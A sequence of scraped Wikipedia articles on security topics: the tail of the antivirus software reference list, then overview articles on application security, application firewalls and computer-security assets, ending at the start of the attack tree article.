. April 2009. 
Archived
 from the original on December 8, 2009
. Retrieved 
November 29,
 2009
.




^
 
"Upgrading from Windows Vista to Windows 7"
. 
Archived
 from the original on November 30, 2011
. Retrieved 
March 24,
 2012
.
 Mentioned within "Before you begin".




^
 
"Upgrading to Microsoft Windows Vista recommended steps"
. 
Archived
 from the original on March 8, 2012
. Retrieved 
March 24,
 2012
.




^
 
"How to troubleshoot problems during installation when you upgrade from Windows 98 or Windows Millennium Edition to Windows XP"
. May 7, 2007. 
Archived
 from the original on March 9, 2012
. Retrieved 
March 24,
 2012
.
 Mentioned within "General troubleshooting".




^
 
"BT Home Hub Firmware Upgrade Procedure"
. Archived from 
the original
 on May 12, 2011
. Retrieved 
March 6,
 2011
.




^
 
"Troubleshooting"
. Retrieved 
February 17,
 2011
.




^
 
"Spyware, Adware, and Viruses Interfering with Steam"
. 
Archived
 from the original on July 1, 2013
. Retrieved 
April 11,
 2013
.
 Steam support page.




^
 
"Field Notice: FN – 63204 – Cisco Clean Access has Interoperability issue with Symantec Anti-virus – delays Agent start-up"
. 
Archived
 from the original on September 24, 2009.




^
 
Goodin, Dan (December 21, 2007). 
"Anti-virus protection gets worse"
. 
Channel Register
. 
Archived
 from the original on May 11, 2011
. Retrieved 
February 24,
 2011
.




^
 
"ZeuS Tracker :: Home"
. 
Archived
 from the original on November 3, 2010.




^
 
Illett, Dan (July 13, 2007). 
"Hacking poses threats to business"
. 
Computer Weekly
. 
Archived
 from the original on January 12, 2010
. Retrieved 
November 15,
 2009
.




^
 
Espiner, Tom (June 30, 2008). 
"Trend Micro: Antivirus industry lied for 20 years"
. 
ZDNet
. 
Archived
 from the original on October 6, 2014
. Retrieved 
September 27,
 2014
.




^
 
AV Comparatives (December 2013). 
"Whole Product Dynamic "Real World" Production Test"
 
(PDF)
. 
Archived
 
(PDF)
 from the original on January 2, 2014
. Retrieved 
January 2,
 2014
.




^
 
Kirk, Jeremy (June 14, 2010). 
"Guidelines released for antivirus software tests"
. 
Archived
 from the original on April 22, 2011.




^
 
Harley, David
 (2011). 
AVIEN Malware Defense Guide for the Enterprise
. 
Elsevier
. p. 487. 
ISBN
 
9780080558660
. 
Archived
 from the original on January 3, 2014.




^
 
Kotadia, Munir (July 2006). 
"Why popular antivirus apps 'do not work'
"
. 
ZDNet
. 
Archived
 from the original on April 30, 2011
. Retrieved 
April 14,
 2010
.




^ 
a
 
b
 
The Canadian Press
 (April 2010). 
"Internet scam uses adult game to extort cash"
. 
CBC News
. 
Archived
 from the original on April 18, 2010
. Retrieved 
April 17,
 2010
.




^
 
"Researchers up evilness ante with GPU-assisted malware"
. 
The Register
. 
Archived
 from the original on August 10, 2017.




^
 
Iresh, Gina (April 10, 2010). 
"Review of Bitdefender Antivirus Security Software 2017 edition"
. 
www.digitalgrog.com.au
. Digital Grog. 
Archived
 from the original on November 21, 2016
. Retrieved 
November 20,
 2016
.




^
 
"Why F-PROT Antivirus fails to disinfect the virus on my computer?"
. 
Archived
 from the original on September 17, 2015
. Retrieved 
August 20,
 2015
.




^
 
"Actions to be performed on infected objects"
. 
Archived
 from the original on August 9, 2015
. Retrieved 
August 20,
 2015
.




^
 
"Cryptolocker Ransomware: What You Need To Know"
. October 8, 2013. 
Archived
 from the original on February 9, 2014
. Retrieved 
March 28,
 2014
.




^
 
"How Anti-Virus Software Works"
. 
Archived
 from the original on March 2, 2011
. Retrieved 
February 16,
 2011
.




^
 
"The 10 faces of computer malware"
. July 17, 2009. 
Archived
 from the original on February 9, 2011
. Retrieved 
March 6,
 2011
.




^
 
"New BIOS Virus Withstands HDD Wipes"
. March 27, 2009. 
Archived
 from the original on April 1, 2011
. Retrieved 
March 6,
 2011
.




^
 
"Phrack Inc. Persistent BIOS Infection"
. June 1, 2009. Archived from 
the original
 on April 30, 2011
. Retrieved 
March 6,
 2011
.




^
 
"Turning USB peripherals into BadUSB"
. 
Archived
 from the original on April 18, 2016
. Retrieved 
October 11,
 2014
.




^
 
Greenberg, Andy (July 31, 2014). 
"Why the Security of USB Is Fundamentally Broken"
. 
Wired
. 
Archived
 from the original on August 3, 2014
. Retrieved 
October 11,
 2014
.




^
 
"How Antivirus Software Can Slow Down Your Computer"
. Support.com Blog. Archived from 
the original
 on September 29, 2012
. Retrieved 
July 26,
 2010
.




^
 
"Softpedia Exclusive Interview: Avira 10"
. 
Ionut Ilascu
. Softpedia. April 14, 2010. 
Archived
 from the original on August 26, 2011
. Retrieved 
September 11,
 2011
.




^
 
"Norton AntiVirus ignores malicious WMI instructions"
. 
Munir Kotadia
. CBS Interactive. October 21, 2004. 
Archived
 from the original on September 12, 2009
. Retrieved 
April 5,
 2009
.




^
 
"NSA and GCHQ attacked antivirus software so that they could spy on people, leaks indicate"
. June 24, 2015
. Retrieved 
October 30,
 2016
.




^ 
a
 
b
 
"Popular security software came under relentless NSA and GCHQ attacks"
. 
Andrew Fishman, Morgan Marquis-Boire
. June 22, 2015. 
Archived
 from the original on October 31, 2016
. Retrieved 
October 30,
 2016
.




^
 
Zeltser, Lenny (October 2010). 
"What Is Cloud Anti-Virus and How Does It Work?"
. 
Archived
 from the original on October 10, 2010
. Retrieved 
October 26,
 2010
.




^
 
Erickson, Jon (August 6, 2008). 
"Antivirus Software Heads for the Clouds"
. 
Information Week
. 
Archived
 from the original on April 26, 2011
. Retrieved 
February 24,
 2010
.




^
 
"Comodo Cloud Antivirus released"
. wikipost.org. 
Archived
 from the original on May 17, 2016
. Retrieved 
May 30,
 2016
.




^
 
"Comodo Cloud Antivirus User Guideline PDF"
 
(PDF)
. help.comodo.com. 
Archived
 
(PDF)
 from the original on June 4, 2016
. Retrieved 
May 30,
 2016
.




^
 
Krebs, Brian (March 9, 2007). 
"Online Anti-Virus Scans: A Free Second Opinion"
. 
The Washington Post
. Archived from 
the original
 on April 22, 2011
. Retrieved 
February 24,
 2011
.




^
 
"Windows Malicious Software Removal Tool 64-bit"
. 
Microsoft
. Retrieved 
December 27,
 2022
.




^
 
"Sophos Scan & Clean"
. 
Sophos
. Retrieved 
December 27,
 2022
.




^
 
"Download Kaspersky Virus Removal Tool application"
. 
Kaspersky Lab
. Retrieved 
December 27,
 2022
.




^
 
"How To Tell If a Virus Is Actually a False Positive"
. 
How To Geek
. Retrieved 
October 2,
 2018
.




^
 
"Rescue Disk"
. 
Trend Micro
. Retrieved 
December 27,
 2022
.




^
 
"Download Kaspersky Rescue Disk"
. 
Kaspersky Lab
. Retrieved 
December 27,
 2022
.




^
 
"Best Comodo Rescue Disk 2022"
. 
Comodo Group
. Retrieved 
December 27,
 2022
.




^
 
"FBI estimates major companies lose $12m annually from viruses"
. January 30, 2007. Archived from 
the original
 on July 24, 2012
. Retrieved 
February 20,
 2011
.




^
 
Kaiser, Michael (April 17, 2009). 
"Small and Medium Size Businesses are Vulnerable"
. 
National Cyber Security Alliance
. Archived from 
the original
 on September 17, 2012
. Retrieved 
February 24,
 2011
.




^
 
Nearly 50% Women Don’t Use Anti-virus Software
 
Archived
 May 13, 2013, at the 
Wayback Machine
. Spamfighter.com (September 2, 2010). Retrieved on January 3, 2017.






General bibliography
[
edit
]




Szor, Peter (2005). 
The Art of Computer Virus Research and Defense
. Addison-Wesley. 
ISBN
 
978-0-321-30454-4
.








v
t
e
Information security
Related security categories


Computer security


Automotive security


Cybercrime


Cybersex trafficking


Computer fraud


Cybergeddon


Cyberterrorism


Cyberwarfare


Electromagnetic warfare


Information warfare


Internet security


Mobile security


Network security


Copy protection


Digital rights management


vectorial version
Threats


Adware


Advanced persistent threat


Arbitrary code execution


Backdoors


Bombs

Fork


Logic


Time


Zip


Hardware backdoors


Code injection


Crimeware


Cross-site scripting


Cross-site leaks


DOM clobbering


History sniffing


Cryptojacking


Botnets


Data breach


Drive-by download


Browser Helper Objects


Viruses


Data scraping


Denial-of-service attack


Eavesdropping


Email fraud


Email spoofing


Exploits


Fraudulent dialers


Hacktivism


Infostealer


Insecure direct object reference


Keystroke loggers


Malware


Payload


Phishing


Voice


Polymorphic engine


Privilege escalation


Ransomware


Rootkits


Scareware


Shellcode


Spamming


Social engineering


Spyware


Software bugs


Trojan horses


Hardware Trojans


Remote access trojans


Vulnerability


Web shells


Wiper


Worms


SQL injection


Rogue security software


Zombie


Defenses


Application security


Secure coding


Secure by default


Secure by design


Misuse case


Computer access control


Authentication


Multi-factor authentication


Authorization


Computer security software


Antivirus software


Security-focused operating system


Data-centric security


Obfuscation (software)


Data masking


Encryption


Firewall


Intrusion detection system


Host-based intrusion detection system
 (HIDS)


Anomaly detection


Information security management


Information risk management


Security information and event management
 (SIEM)


Runtime application self-protection


Site isolation




v
t
e
Malware
 topics
Infectious malware


Comparison of computer viruses


Computer virus


Computer worm


List of computer worms


Timeline of computer viruses and worms


Concealment


Backdoor


Clickjacking


Man-in-the-browser


Man-in-the-middle


Rootkit


Trojan horse


Zombie computer


Malware for profit


Adware


Botnet


Crimeware


Fleeceware


Form grabbing


Fraudulent dialer


Infostealer


Keystroke logging


Malbot


Privacy-invasive software


Ransomware


Rogue security software


Scareware


Spyware


Web threats


By operating system


Android malware


Classic Mac OS viruses


iOS malware


Linux malware


MacOS malware


Macro virus


Mobile malware


Palm OS viruses


HyperCard viruses


Protection


Anti-keylogger


Antivirus software


Browser security


Data loss prevention software


Defensive computing


Firewall


Internet security


Intrusion detection system


Mobile security


Network security


Countermeasures


Computer and network surveillance


Honeypot


Operation: Bot Roast




v
t
e
Antivirus software
Companies


Bitdefender


Check Point


ZoneAlarm


Cisco


ClamWin


Comodo


Dr.Web


ESET


F-Secure


Fortinet


FRISK


G Data CyberDefense


Gen


Avast


AVG


Avira


Norton


Intego


Kaspersky


Kingsoft


Lavasoft


Malwarebytes


McAfee


Microsoft


NANO Security


Panda


Quick Heal


Qihoo 360


Sophos


Trend Micro


VIPRE


VirusBlokAda


Webroot


Products
Desktop,
server


360 Safeguard


Avast Antivirus


AVG AntiVirus


Avira Internet Security


Bitdefender


ClamTk


ClamWin


Clam AntiVirus


Comodo Antivirus


Comodo Internet Security


Dr.Web


ESET NOD32


F-Secure


F-PROT


Fortinet


G Data


Immunet


Mac Internet Security


Kaspersky Anti-Virus


Kaspersky Internet Security


Malwarebytes


McAfee VirusScan


Microsoft Defender Antivirus


Microsoft Security Essentials


NANO Antivirus


Norton AntiVirus


Norton Internet Security


Panda


Sophos


Symantec Endpoint Protection


Spyware Doctor


Trend Micro Internet Security


Vba32 AntiVirus


VirusBarrier


ZoneAlarm


Mobile,
tablet


Avast Antivirus


AVG AntiVirus


Avira Free Android Security


Bitdefender Mobile Security


CM Security


Comodo Mobile Security


Dr.Web Mobile Security Suite


ESET Mobile Security


F-Secure Mobile Security


FireAMP Mobile


G Data Mobile Security


McAfee Mobile Security


Trend Micro Mobile Security


VirusBarrier


Related


Comparison of antivirus software












Retrieved from "
https://en.wikipedia.org/w/index.php?title=Antivirus_software&oldid=1244193158
"


Categories
: 
Antivirus software
Utility software types
Hidden categories: 
Webarchive template wayback links
Wikipedia articles needing page number citations from August 2020
CS1 Icelandic-language sources (is)
CS1 maint: unfit URL
Articles with short description
Short description is different from Wikidata
Wikipedia indefinitely move-protected pages
Use mdy dates from January 2017
Use American English from March 2023
All Wikipedia articles written in American English
All articles with unsourced statements
Articles with unsourced statements from July 2016
Citation overkill
Articles tagged with the inline citation overkill template from October 2021











From Wikipedia, the free encyclopedia






Measures taken to improve the security of an application


Application security
 (short 
AppSec
) includes all tasks that introduce a secure 
software development life cycle
 to development teams. Its final goal is to improve security practices and, through that, to find, fix and preferably prevent security issues within applications. It encompasses the whole application life cycle from requirements analysis, design, implementation, verification as well as maintenance.
[
1
]


Web application security
 is a branch of 
information security
 that deals specifically with the security of 
websites
, 
web applications
, and 
web services
. At a high level, web application security draws on the principles of application security but applies them specifically to the 
internet
 and 
web
 systems.
[
2
]
[
3
]
 The application security also concentrates on 
mobile apps
 and their security which includes iOS and Android Applications

Web Application Security Tools are specialized tools for working with HTTP traffic, e.g., 
Web application firewalls
.





Approaches
[
edit
]


Different approaches will find different subsets of the security 
vulnerabilities
 lurking in an application and are most effective at different times in the software lifecycle. They each represent different tradeoffs of time, effort, cost and vulnerabilities found.



Design review
. Before code is written the application's architecture and design can be reviewed for security problems. A common technique in this phase is the creation of a 
threat model
.


Whitebox
 security review, or 
code review
. This is a security engineer deeply understanding the application through manually reviewing the source code and noticing security flaws. Through comprehension of the application, vulnerabilities unique to the application can be found.


Blackbox
 
security audit
. This is only through the use of an application testing it for security vulnerabilities, no source code is required.


Automated Tooling. Many security tools can be automated through inclusion into the development or testing environment. Examples of those are automated DAST/SAST tools that are integrated into code editor or CI/CD platforms.


Coordinated vulnerability platforms
. These are hacker-powered application security solutions offered by many websites and software developers by which individuals can receive recognition and compensation for reporting bugs.


Security threats
[
edit
]


The Open Worldwide Application Security Project (
OWASP
) provides free and open resources. It is led by a non-profit called The OWASP Foundation. The OWASP Top 10 - 2017 results from recent research based on comprehensive data compiled from over 40 partner organizations. This data revealed approximately 2.3 million vulnerabilities across over 50,000 applications.
[
4
]
 According to the OWASP Top 10 - 2021, the ten most critical web application security risks include:
[
5
]




Broken 
access control


Cryptographic Failures


Injection


Insecure Design


Security Misconfiguration


Vulnerable and Outdated Components


Identification and Authentification Failures


Software and Data Integrity Failures


Security Logging and Monitoring Failures*


Server-Side Request Forgery (SSRF)*


Security Controls
[
edit
]


The 
OWASP Top 10 Proactive Controls 2024
 is a list of security techniques every software architect and developer should know and heed.

The current list contains:



Implement Access Control


Use Cryptography the proper way


Validate all Input & Handle Exceptions


Address Security from the Start


Secure by Default Configurations


Keep your Components Secure


Implement Digital Identity


Leverage Browser Security Features


Implement Security Logging and Monitoring


Stop Server Side Request Forgery


Tooling for security testing
[
edit
]


Security testing techniques scour for vulnerabilities or security holes in applications. These vulnerabilities leave applications open to 
exploitation
. Ideally, security testing is implemented throughout the entire 
Software Development Life Cycle
 (SDLC) so that vulnerabilities may be addressed in a timely and thorough manner.

There are many kinds of automated tools for identifying vulnerabilities in applications. Common tool categories used for identifying application vulnerabilities include:



Static Application Security Testing
 (SAST) analyzes source code for security vulnerabilities during an application's development. Compared to DAST, SAST can be utilized even before the application is in an executable state. As SAST has access to the full source code it is a white-box approach. This can yield more detailed results but can result in many false positives that need to be manually verified.


Dynamic Application Security Testing
 (DAST, often called 
Vulnerability scanners
) automatically detects vulnerabilities by crawling and analyzing websites. This method is highly scalable, easily integrated and quick. DAST tools are well suited for dealing with low-level attacks such as injection flaws but are not well suited to detect high-level flaws, e.g., logic or business logic flaws.
[
6
]
 
Fuzzing
 tools are commonly used for input testing.
[
7
]


Interactive Application Security Testing (IAST) assesses applications from within using 
software instrumentation
. This combines the strengths of both SAST and DAST methods as well as providing access to code, HTTP traffic, library information, backend connections and configuration information.
[
8
]
[
9
]
 Some IAST products require the application to be attacked, while others can be used during normal quality assurance testing.
[
10
]
[
promotional source?
]
[
11
]
[
promotional source?
]


Runtime application self-protection
 augments existing applications to provide intrusion detection and prevention from within an application runtime.


Dependency scanners (also called 
Software Composition Analysis
) try to detect the usage of software components with known vulnerabilities. These tools can either work on-demand, e.g., during the source code build process, or periodically.


Security standards and regulations
[
edit
]


CERT Secure Coding


ISO/IEC 27034-1:2011 
Information technology — Security techniques — Application security -- Part 1: Overview and concepts


ISO/IEC TR 24772:2013 
Information technology — Programming languages — Guidance to avoiding vulnerabilities in programming languages through language selection and use


NIST Special Publication 800-53


OWASP ASVS: Web Application Security Verification Standard
[
12
]


See also
[
edit
]


Common Weakness Enumeration


Data security


Mobile security


OWASP


Microsoft Security Development Lifecycle


Usable security


References
[
edit
]






^
 
Happe, Andreas (3 June 2021). 
"What is AppSec anyways?"
. 
snikt.net
.




^
 
"Web Application Security Overview"
. 2015-10-23.




^
 
Shuaibu, Bala Musa; Norwawi, Norita Md; Selamat, Mohd Hasan; Al-Alwani, Abdulkareem (2013-01-17). "Systematic review of web application security development model". 
Artificial Intelligence Review
. 
43
 (2): 259–276. 
doi
:
10.1007/s10462-012-9375-6
. 
ISSN
 
0269-2821
. 
S2CID
 
15221613
.




^
 
Korolov, Maria (Apr 27, 2017). "Latest OWASP Top 10 looks at APIs, web apps: The new OWASP Top 10 list is out, and while most of it remains the same, there are new additions focusing on web applications and APIs". 
CSO
. 
ProQuest
 
1892694046
.




^
 
"OWASP Top 10 - 2021: The Ten Most Critical Web Application Security Risks"
. 
Open Web Application Security Project
. 2021
. Retrieved 
January 11,
 2022
.




^
 
"Web Application Vulnerability Scanners"
. NIST.




^
 
"Fuzzing"
. OWASP.




^
 
Williams, Jeff (2 July 2015). 
"I Understand SAST and DAST But What is an IAST and Why Does it Matter?"
. Contrast Security
. Retrieved 
10 April
 2018
.




^
 
Velasco, Roberto (7 May 2020). 
"What is IAST? All About Interactive Application Security Testing"
. Hdiv Security
. Retrieved 
7 May
 2020
.




^
 
Abezgauz, Irene (February 17, 2014). 
"Introduction to Interactive Application Security Testing"
. Quotium. Archived from 
the original
 on April 3, 2018
. Retrieved 
January 25,
 2018
.




^
 
Rohr, Matthias (November 26, 2015). 
"IAST: A New Approach For Agile Security Testing"
. Secodis.




^
 
"OWASP Application Security Verification Standard"
.










v
t
e
Information security
Related security categories


Computer security


Automotive security


Cybercrime


Cybersex trafficking


Computer fraud


Cybergeddon


Cyberterrorism


Cyberwarfare


Electromagnetic warfare


Information warfare


Internet security


Mobile security


Network security


Copy protection


Digital rights management


vectorial version
Threats


Adware


Advanced persistent threat


Arbitrary code execution


Backdoors


Bombs

Fork


Logic


Time


Zip


Hardware backdoors


Code injection


Crimeware


Cross-site scripting


Cross-site leaks


DOM clobbering


History sniffing


Cryptojacking


Botnets


Data breach


Drive-by download


Browser Helper Objects


Viruses


Data scraping


Denial-of-service attack


Eavesdropping


Email fraud


Email spoofing


Exploits


Fraudulent dialers


Hacktivism


Infostealer


Insecure direct object reference


Keystroke loggers


Malware


Payload


Phishing


Voice


Polymorphic engine


Privilege escalation


Ransomware


Rootkits


Scareware


Shellcode


Spamming


Social engineering


Spyware


Software bugs


Trojan horses


Hardware Trojans


Remote access trojans


Vulnerability


Web shells


Wiper


Worms


SQL injection


Rogue security software


Zombie


Defenses


Application security


Secure coding


Secure by default


Secure by design


Misuse case


Computer access control


Authentication


Multi-factor authentication


Authorization


Computer security software


Antivirus software


Security-focused operating system


Data-centric security


Obfuscation (software)


Data masking


Encryption


Firewall


Intrusion detection system


Host-based intrusion detection system
 (HIDS)


Anomaly detection


Information security management


Information risk management


Security information and event management
 (SIEM)


Runtime application self-protection


Site isolation












Retrieved from "
https://en.wikipedia.org/w/index.php?title=Application_security&oldid=1244066347
"


Categories
: 
Mobile security
Data security
Hidden categories: 
Articles with short description
Short description is different from Wikidata
All articles lacking reliable references
Articles lacking reliable references from December 2018











From Wikipedia, the free encyclopedia






Layer 7/application layer network security system


This article is about a sub-type of network firewall. For the primary topic of firewalls, see 
Firewall (computing)
.


This article 
needs additional citations for 
verification
.
 Please help 
improve this article
 by 
adding citations to reliable sources
. Unsourced material may be challenged and removed.
Find sources:
 
"Application firewall"
 – 
news
 
·
 
newspapers
 
·
 
books
 
·
 
scholar
 
·
 
JSTOR
 
(
February 2010
)
 (
Learn how and when to remove this message
)


An 
application firewall
 is a form of 
firewall
 that controls 
input/output
 or 
system calls
 of an application or service. It operates by monitoring and blocking communications based on a configured policy, generally with predefined rule sets to choose from. The two primary categories of application firewalls are 
network-based
 and 
host-based
.





History
[
edit
]


Gene Spafford
 of 
Purdue University
, 
Bill Cheswick
 at 
AT&T Laboratories
, and 
Marcus Ranum
 described a third-generation firewall known as an application layer firewall. Marcus Ranum's work, based on the firewall created by 
Paul Vixie
, 
Brian Reid
, and Jeff Mogul, spearheaded the creation of the first commercial product. The product was released by DEC, named the DEC SEAL by 
Geoff Mulligan
 - Secure External Access Link. DEC's first major sale was on June 13, 1991, to Dupont.

Under a broader DARPA contract at TIS, Marcus Ranum, Wei Xu, and Peter Churchyard developed the Firewall Toolkit (FWTK) and made it freely available under license in October 1993.
[
1
]
 The purposes for releasing the freely available, not for commercial use, FWTK were: to demonstrate, via the software, documentation, and methods used, how a company with (at the time) 11 years experience in formal security methods, and individuals with firewall experience, developed firewall software; to create a common base of very good firewall software for others to build on (so people did not have to continue to "roll their own" from scratch); to "raise the bar" of firewall software being used. However, FWTK was a basic application proxy requiring the user interactions.

In 1994, Wei Xu extended the FWTK with the Kernel enhancement of IP stateful filter and socket transparent. This was the first transparent firewall, known as the inception of 
the third generation firewall
, beyond a traditional application proxy (
the second generation firewall
), released as the commercial product known as Gauntlet firewall. Gauntlet firewall was rated one of the top application firewalls from 1995 until 1998, the year it was acquired by Network Associates Inc, (NAI). Network Associates continued to claim that Gauntlet was the "worlds most secure firewall" but in May 2000, security researcher 
Jim Stickley
 discovered a large vulnerability in the firewall, allowing remote access to the operating system and bypassing the security controls.
[
2
]
 
Stickley
 discovered a second vulnerability a year later, effectively ending Gauntlet firewalls' security dominance.
[
3
]




Description
[
edit
]


Application layer
 filtering operates at a higher level than traditional security appliances. This allows packet decisions to be made based on more than just source/destination IP Address or ports and can also use information spanning across multiple connections for any given host.



Network-based application firewalls
[
edit
]


See also: 
Web application firewall


Network-based application firewalls operate at the application layer of a 
 TCP/IP stack
[
4
]
 and can understand certain applications and protocols such as 
File Transfer Protocol
 (FTP), 
Domain Name System
 (DNS), or 
Hypertext Transfer Protocol
 (HTTP). This allows it to identify unwanted applications or services using a non standard port or detect if an allowed protocol is being abused.
[
5
]


Modern versions of network-based application firewalls can include the following technologies:



 Encryption offloading 


Intrusion prevention system


Data loss prevention


Web application firewalls (WAF) are a specialized version of a network-based appliance that acts as a 
reverse proxy
, inspecting traffic before being forwarded to an associated server.



Host-based application firewalls
[
edit
]


A host-based application firewall monitors application 
 system calls
 or other general system communication. This gives more granularity and control, but is limited to only protecting the host it is running on. Control is applied by filtering on a per process basis. Generally, prompts are used to define rules for processes that have not yet received a connection. Further filtering can be done by examining the process ID of the owner of the data packets. Many host-based application firewalls are combined or used in conjunction with a packet filter.
[
6
]


Due to technological limitations, modern solutions such as 
 sandboxing
 are being used as a replacement of host-based application firewalls to protect system processes.
[
7
]




Implementations
[
edit
]


There are various application firewalls available, including both free and open source software and commercial products.



Mac OS X
[
edit
]


Starting with Mac OS X Leopard, an implementation of the TrustedBSD MAC framework (taken from FreeBSD), was included.
[
8
]
 The TrustedBSD MAC framework is used to sandbox services and provides a firewall layer, given the configuration of the sharing services in 
Mac OS
 X Leopard and Snow Leopard. Third-party applications can provide extended functionality, including filtering out outgoing connections by app.



Linux
[
edit
]


This is a list of security software packages for Linux, allowing filtering of application to OS communication, possibly on a by-user basis:



AppArmor


Kerio Control
 - a commercial Product


ModSecurity
 - also works under Windows, Mac OS X, 
Solaris
 and other versions of 
Unix
. ModSecurity is designed to work with the web-servers IIS, Apache2 and NGINX.


Portmaster
 by Safing is an activity monitoring application. It is also available on 
Windows
.
[
9
]


Systrace


Zorp


Windows
[
edit
]


Portmaster


Microsoft Defender Firewall


WinGate


Network appliances
[
edit
]


These devices may be sold as hardware, software, or virtualized network appliances.



Next-Generation Firewalls:




Cisco Firepower Threat Defense


Check Point


Fortinet
 FortiGate Series


Juniper Networks
 SRX Series


Palo Alto Networks


SonicWALL
 TZ/NSA/SuperMassive Series




Web Application Firewalls/LoadBalancers:




A10 Networks
 Web Application Firewall


Barracuda Networks
 Web Application Firewall/Load Balancer ADC


Citrix NetScaler


F5 Networks
 BIG-IP Application Security Manager


Fortinet
 FortiWeb Series


KEMP Technologies


Imperva




Others:




CloudFlare


Meraki


Smoothwall


Snapt Inc


See also
[
edit
]




ModSecurity


Computer security


Content-control software


Proxy server


Information security


Application security


Network security




References
[
edit
]






^
 
"Firewall toolkit V1.0 release"
. Retrieved 
2018-12-28
.




^
 
Kevin Pulsen (May 22, 2000). 
"Security Hole found in NAI Firewall"
. securityfocus.com
. Retrieved 
2018-08-14
.




^
 
Kevin Pulsen (September 5, 2001). 
"Gaping hole in NAI's Gauntlet firewall"
. theregister.co.uk
. Retrieved 
2018-08-14
.




^
 
Luis F. Medina (2003). 
The Weakest Security Link Series
 (1st ed.). IUniverse. p. 54. 
ISBN
 
978-0-595-26494-0
.




^
 
"What is Layer 7? How Layer 7 of the Internet Works"
. 
Cloudflare
. Retrieved 
Aug 29,
 2020
.




^
 
"Software Firewalls: Made of Straw? Part 1 of 2"
. 
Symantec.com
. Symantec Connect Community. 2010-06-29
. Retrieved 
2013-09-05
.




^
 
"What is sandbox (software testing and security)? - Definition from WhatIs.com"
. 
SearchSecurity
. Retrieved 
2020-11-15
.




^
 
"Mandatory Access Control (MAC) Framework"
. TrustedBSD
. Retrieved 
2013-09-05
.




^
 
"Safing Portmaster"
. 
safing.io
. Retrieved 
2021-11-04
.






External links
[
edit
]


Web Application Firewall
, Open Web Application Security Project


Web Application Firewall Evaluation Criteria
, from the 
Web Application Security Consortium


Safety in the cloud(s): 'Vaporizing' the Web application firewall to secure cloud computing


v
t
e
Information security
Related security categories


Computer security


Automotive security


Cybercrime


Cybersex trafficking


Computer fraud


Cybergeddon


Cyberterrorism


Cyberwarfare


Electromagnetic warfare


Information warfare


Internet security


Mobile security


Network security


Copy protection


Digital rights management


vectorial version
Threats


Adware


Advanced persistent threat


Arbitrary code execution


Backdoors


Bombs

Fork


Logic


Time


Zip


Hardware backdoors


Code injection


Crimeware


Cross-site scripting


Cross-site leaks


DOM clobbering


History sniffing


Cryptojacking


Botnets


Data breach


Drive-by download


Browser Helper Objects


Viruses


Data scraping


Denial-of-service attack


Eavesdropping


Email fraud


Email spoofing


Exploits


Fraudulent dialers


Hacktivism


Infostealer


Insecure direct object reference


Keystroke loggers


Malware


Payload


Phishing


Voice


Polymorphic engine


Privilege escalation


Ransomware


Rootkits


Scareware


Shellcode


Spamming


Social engineering


Spyware


Software bugs


Trojan horses


Hardware Trojans


Remote access trojans


Vulnerability


Web shells


Wiper


Worms


SQL injection


Rogue security software


Zombie


Defenses


Application security


Secure coding


Secure by default


Secure by design


Misuse case


Computer access control


Authentication


Multi-factor authentication


Authorization


Computer security software


Antivirus software


Security-focused operating system


Data-centric security


Obfuscation (software)


Data masking


Encryption


Firewall


Intrusion detection system


Host-based intrusion detection system
 (HIDS)


Anomaly detection


Information security management


Information risk management


Security information and event management
 (SIEM)


Runtime application self-protection


Site isolation




v
t
e
Firewall software


Application firewall


Context-based access control


Personal firewall


Stateful firewall


Virtual firewall


Linux
Apps


FireHOL


Firestarter


firewalld


Netfilter


iptables


nftables


MoBlock


Privoxy


Shorewall


Squid


Uncomplicated Firewall


Distros


Endian Firewall


IPFire


LEDE


OpenWrt


SmoothWall


VyOS


Zeroshell


BSD
Apps


IPFilter


ipfirewall


NPF


PF


pfsync


Distros


OPNsense


pfSense


macOS


Little Snitch


NetBarrier X4


PeerGuardian


VirusBarrier X6


Windows
Commercial


Check Point Integrity


Kaspersky Internet Security


McAfee Personal Firewall Plus


Microsoft Forefront Threat Management Gateway


Norton 360


Norton Internet Security


Norton Personal Firewall


Outpost Firewall Pro


Symantec Endpoint Protection


Trend Micro Internet Security


Windows Firewall


Windows Live OneCare


WinGate


WinRoute


Freemium


Comodo Internet Security


ZoneAlarm


Open-source


PeerBlock


PeerGuardian




Comparison of firewalls


List of router or firewall distributions












Retrieved from "
https://en.wikipedia.org/w/index.php?title=Application_firewall&oldid=1221433118
"


Categories
: 
Firewall software
Packets (information technology)
Data security
Cyberwarfare
Hidden categories: 
Articles with short description
Short description is different from Wikidata
Articles needing additional references from February 2010
All articles needing additional references











From Wikipedia, the free encyclopedia






Data, device, or other component of a computing environment


For other uses, see 
Asset (disambiguation)
.


In 
information security
, 
computer security
 and 
network security
, an 
asset
 is any data, device, or other component of the environment that supports information-related activities.   Assets generally include hardware (e.g. servers and switches), software (e.g. mission critical applications and support systems) and confidential information.
[
1
]
[
2
]
 Assets should be protected from illicit access, use, disclosure, alteration, destruction, and/or theft, resulting in loss to the organization.
[
3
]






The CIA triad
[
edit
]


The goal of 
information security
 is to ensure the 
confidentiality
, 
integrity
 and 
availability
 (CIA) of assets from various 
threats
.  For example, a 
hacker
 might 
attack
 a system in order to steal credit card numbers by 
exploiting
 a 
vulnerability
. Information Security experts must assess the likely impact of an attack and employ appropriate 
countermeasures
.
[
4
]
  In this case they might put up a 
firewall
 and 
encrypt
 their credit card numbers.



Risk analysis
[
edit
]


When performing 
risk assessment
, it is important to weigh how much to spend protecting each asset against the cost of losing the asset. It is also important to take into account the chance of each loss occurring.  Intangible costs must also be factored in.  If a hacker makes a copy of all a company's credit card numbers it does not cost them anything directly but the loss in fines and reputation can be enormous.



See also
[
edit
]


Countermeasure (computer)


Factor analysis of information risk


Information security management


IT risk


Risk factor


Risk management


References
[
edit
]






^
 
"ISO/IEC 27005:2022 - Information security, cybersecurity and privacy protection"
. 
ISO
. October 2022
. Retrieved 
31 December
 2023
.




^
 
"ENISA Glossary"
. Archived from 
the original
 on 2012-02-29
. Retrieved 
2010-11-21
.




^
 
"An Introduction to Factor Analysis of Information Risk (FAIR)", Risk Management Insight LLC, November 2006
 
Archived
 2014-11-18 at the 
Wayback Machine
;




^
 
IETF 
RFC
 
2828






External links
[
edit
]


FISMApedia TERM










Retrieved from "
https://en.wikipedia.org/w/index.php?title=Asset_(computer_security)&oldid=1192820066
"


Categories
: 
Data security
IT risk management
Reliability analysis
Security compliance
Hidden categories: 
Webarchive template wayback links
Articles with short description
Short description is different from Wikidata











From Wikipedia, the free encyclopedia






Conceptual diagrams showing how an asset, or target, might be attacked


This article 
needs additional citations for 
verification
.
 Please help 
improve this article
 by 
adding citations to reliable sources
. Unsourced material may be challenged and removed.
Find sources:
 
"Attack tree"
 – 
news
 
·
